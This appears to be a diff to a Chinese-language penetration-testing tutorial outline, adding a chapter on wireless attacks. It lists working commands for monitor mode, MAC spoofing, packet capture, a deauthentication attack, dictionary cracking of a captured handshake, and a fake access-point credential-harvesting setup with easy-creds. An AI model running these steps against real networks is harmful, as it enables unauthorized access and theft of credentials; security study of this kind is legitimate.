@@ -135,7 +135,42 @@
         8.1.5. 创建密码字典
             crunch、rtgen (彩虹表)
 第九章、无线网络渗透测试
-
+    9.1. Aircrack-ng 破解无线
+        9.1.1. 查看无线网络接口
+            airmon-ng
+        9.1.2. 停止无线网络接口
+            airmon-ng stop wlan0
+        9.1.3. 修改无线网卡mac地址
+            macchanger --mac xxx wlan0
+        9.1.4. 启用无线网络接口
+            airmon-ng start wlan0
+        9.1.5. 捕获数据包
+            airodump-ng -c 1 -w abc --bssid (mac地址) wlan0mon
+        9.1.6. 对无线路由器Test进行deauth攻击
+            aireplay-ng --deauth 1 -a (路由mac地址) -c (自定义mac地址) wlan0mon
+        9.1.7. 破解密码
+            aircrack-ng -w ./dic/wordlist wirelesssattack-01.cap
+    9.2. easy-creds工具攻击无线网络
+        9.2.1. 下载easy-credss安装包
+            https://github.com/brav0hax/easy-creds
+            easy-creds-master.zip
+        9.2.2. 进入easy-creds目录
+            unzip easy-creds-master.zip
+            cd easy-creds
+            选择 1 debian
+            出现happy hunting即为成功
+        9.2.3. 启动easy-creds工具
+            ./easy-creds.sh
+        9.2.4. 选择AP攻击
+            选择编号3
+        9.2.5. 选择静态伪AP攻击
+            选择编号1
+        9.2.6. 选择数据恢复
+            选择编号4
+        9.2.7. 分析ettercap.eci
+            选择编号3
+            拷贝上面eci全路径
+            over
                         </code>
                     </pre>
                 </figure>
